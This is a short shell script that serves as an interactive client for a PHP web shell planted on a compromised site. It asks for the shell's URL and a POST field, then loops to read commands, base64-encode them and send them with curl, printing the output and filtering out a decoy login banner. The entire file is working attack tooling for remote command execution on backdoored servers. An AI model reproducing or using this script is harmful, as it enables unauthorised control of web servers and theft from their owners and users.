#!/bin/sh
 
echo "Enter full URL of site and php file with shell "
read exploiturl
echo "Enter POST field name [Default: user] "
read idfield
if [ -z $idfield ]; then
        idfield="user"
fi
while [ true ]
do
echo -n ">> "
read cmd
 
command=$(echo -n $cmd | base64)
 
curl -s $exploiturl  --data "$idfield=$command" | lynx --dump -stdin | grep -v "____________________ Login"
 
done
